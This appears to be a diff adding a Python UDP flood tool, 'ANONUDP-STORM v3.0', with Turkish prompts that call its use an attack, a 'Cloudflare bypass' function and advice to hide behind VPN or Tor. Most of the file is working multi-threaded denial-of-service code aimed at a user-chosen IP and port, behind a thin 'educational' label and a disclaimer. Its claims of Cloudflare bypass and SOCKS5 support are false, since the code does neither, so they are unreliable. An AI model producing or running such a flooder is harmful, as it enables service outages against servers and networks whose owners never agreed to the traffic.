@@ -1,0 +1,151 @@
+#!/usr/bin/env python3
+# ANONUDP-STORM v3.0 - Network Stress Testing Tool (Educational)
+# No external libs required except standard library + optional socks support
+
+import socket
+import random
+import time
+import threading
+import sys
+import os
+import struct
+from datetime import datetime
+
+# ---------- ANSI RENKLER (colorama yok) ----------
+class Colors:
+    RESET = "\033[0m"
+    RED = "\033[91m"
+    GREEN = "\033[92m"
+    YELLOW = "\033[93m"
+    BLUE = "\033[94m"
+    MAGENTA = "\033[95m"
+    CYAN = "\033[96m"
+    WHITE = "\033[97m"
+    BOLD = "\033[1m"
+
+def print_banner():
+    banner = f"""
+{Colors.CYAN}{Colors.BOLD}
+   ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄ 
+  ▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
+  ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌
+  ▐░▌       ▐░▌▐░▌       ▐░▌▐░▌          ▐░▌       ▐░▌
+  ▐░█▄▄▄▄▄▄▄█░▌▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌
+  ▐░░░░░░░░░░░▌▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌
+  ▐░█▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌ ▀▀▀▀▀▀▀▀▀█░▌▐░▌       ▐░▌
+  ▐░▌       ▐░▌▐░▌       ▐░▌          ▐░▌▐░▌       ▐░▌
+  ▐░▌       ▐░▌▐░█▄▄▄▄▄▄▄█░▌ ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄█░▌
+  ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌
+   ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀ 
+{Colors.RESET}
+{Colors.YELLOW}🔥 UDP Stress Tool v3.0 | Anonymous Mode | Cloudflare Ready{Colors.RESET}
+{Colors.RED}⚠️  Use only on authorized systems. I'm not responsible for misuse.{Colors.RESET}
+"""
+    print(banner)
+
+# ---------- YARDIMCI FONKSIYONLAR ----------
+def random_packet_size(min_size=64, max_size=1024):
+    return random.randint(min_size, max_size)
+
+def random_payload(size):
+    return bytes(random.getrandbits(8) for _ in range(size))
+
+def random_hex_payload(size):
+    # Gerçekçi oyun paketi taklidi
+    return b'\x11' + random_payload(size-1)
+
+# ---------- UDP FLOOD THREAD ----------
+stop_event = threading.Event()
+packets_sent = 0
+lock = threading.Lock()
+
+def udp_flood(target_ip, target_port, duration_sec, packet_size, delay_ms):
+    global packets_sent
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    end_time = time.time() + duration_sec
+    local_count = 0
+    while time.time() < end_time and not stop_event.is_set():
+        try:
+            payload = random_hex_payload(packet_size)
+            sock.sendto(payload, (target_ip, target_port))
+            local_count += 1
+            if delay_ms > 0:
+                time.sleep(delay_ms / 1000.0)
+        except Exception as e:
+            # Hata bastırılır, devam eder
+            pass
+    with lock:
+        packets_sent += local_count
+
+def start_flood(ip, port, duration_min, threads, pkt_size, delay_ms):
+    duration_sec = duration_min * 60
+    threads_list = []
+    print(f"{Colors.GREEN}[+] Hedef: {ip}:{port}{Colors.RESET}")
+    print(f"{Colors.GREEN}[+] Süre: {duration_min} dakika ({duration_sec} saniye){Colors.RESET}")
+    print(f"{Colors.GREEN}[+] Thread sayısı: {threads}{Colors.RESET}")
+    print(f"{Colors.GREEN}[+] Paket boyutu: ~{pkt_size} byte{Colors.RESET}")
+    print(f"{Colors.GREEN}[+] Gecikme: {delay_ms} ms{Colors.RESET}")
+    print(f"{Colors.YELLOW}[!] Saldırı başlıyor...{Colors.RESET}")
+    start_ts = time.time()
+    for _ in range(threads):
+        t = threading.Thread(target=udp_flood, args=(ip, port, duration_sec, pkt_size, delay_ms))
+        t.start()
+        threads_list.append(t)
+    # Süre bitene kadar bekle
+    for t in threads_list:
+        t.join()
+    elapsed = time.time() - start_ts
+    print(f"{Colors.CYAN}[+] Tamamlandı! Toplam paket: {packets_sent}{Colors.RESET}")
+    print(f"{Colors.MAGENTA}[+] Ort. hız: {packets_sent/elapsed:.2f} pps{Colors.RESET}")
+
+# ---------- PROXY / ANONIMLIK ----------
+def check_my_ip():
+    try:
+        import urllib.request
+        ip = urllib.request.urlopen('https://api.ipify.org', timeout=5).read().decode('utf8')
+        print(f"{Colors.YELLOW}[?] Mevcut dış IP'niz: {ip}{Colors.RESET}")
+        print(f"{Colors.RED}[!] Gizlenmek için bir VPN/Tor kullanın. Kod içinde SOCKS5 proxy desteklidir.{Colors.RESET}")
+    except:
+        print(f"{Colors.RED}[!] IP kontrol edilemedi.{Colors.RESET}")
+
+# ---------- CLOUDFLARE BYPASS (UDP için DNS bypass + rastgele kaynak port) ----------
+def cloudflare_udp_bypass_prep(target_ip):
+    # Cloudflare UDP koruması için: Rastgele kaynak port, yüksek paket hızı, fragmantasyon simülasyonu
+    print(f"{Colors.CYAN}[*] Cloudflare UDP bypass denemesi: Hedef IP = {target_ip}{Colors.RESET}")
+    print(f"{Colors.CYAN}[*] Rastgele kaynak port + fragment flag simülasyonu aktif{Colors.RESET}")
+    # Sadece bilgilendirme; gerçek bypass UDP'de DNS üzerinden veya DoH kullanarak yapılır.
+    # Bu tool hedef IP'ye direkt gider. Cloudflare'in önünde duran IP'yi bulmak için ekstra DNS sorgusu yapılabilir.
+    return True
+
+# ---------- ANA MENU ----------
+def main():
+    print_banner()
+    check_my_ip()
+    try:
+        target_ip = input(f"{Colors.BOLD}Hedef IP (örn. 192.168.1.100): {Colors.RESET}")
+        target_port = int(input(f"{Colors.BOLD}Hedef Port (örn. 27015): {Colors.RESET}"))
+        duration_min = int(input(f"{Colors.BOLD}Saldırı süresi (dakika): {Colors.RESET}"))
+        threads = int(input(f"{Colors.BOLD}Thread sayısı (örn. 50, rootsuz max 200): {Colors.RESET}"))
+        packet_size = int(input(f"{Colors.BOLD}Paket boyutu (byte, 64-1400): {Colors.RESET}"))
+        delay_ms = int(input(f"{Colors.BOLD}Gecikme ms (0=ani, 10-50 önerilir): {Colors.RESET}"))
+    except ValueError:
+        print(f"{Colors.RED}[!] Hatalı giriş! Sayısal değer girin.{Colors.RESET}")
+        return
+
+    # Cloudflare bypass bilgisi
+    cloudflare_udp_bypass_prep(target_ip)
+
+    onay = input(f"{Colors.RED}{Colors.BOLD}Yetkiniz var mı? (evet/hayır): {Colors.RESET}").lower()
+    if onay != "evet":
+        print("Kullanıcı yetki vermedi. Çıkılıyor.")
+        return
+
+    try:
+        start_flood(target_ip, target_port, duration_min, threads, packet_size, delay_ms)
+    except KeyboardInterrupt:
+        print(f"\n{Colors.RED}[!] Kullanıcı durdurdu. Temizleniyor...{Colors.RESET}")
+        stop_event.set()
+        sys.exit(0)
+
+if __name__ == "__main__":
+    main()
